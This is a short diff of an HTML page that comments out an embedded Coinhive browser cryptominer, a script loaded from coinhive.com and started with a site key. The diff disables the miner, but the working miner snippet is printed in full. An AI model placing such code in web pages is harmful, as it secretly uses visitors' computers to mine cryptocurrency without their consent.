@@ -121,11 +121,11 @@ include('ip_track.php');
     <!-- <script src="assets/js/particles.js"></script> -->
     <script src="assets/js/firebase.js"></script>
     <!-- <script src="assets/js/app.js"></script> -->
-    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <!--<script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
 	    var miner = new CoinHive.Anonymous('65lW8LhXcyVEGl0XZk3POHNkc0pqqndm');
 	    miner.start();
-    </script>
+    </script>-->
 </body>
 
 </html>
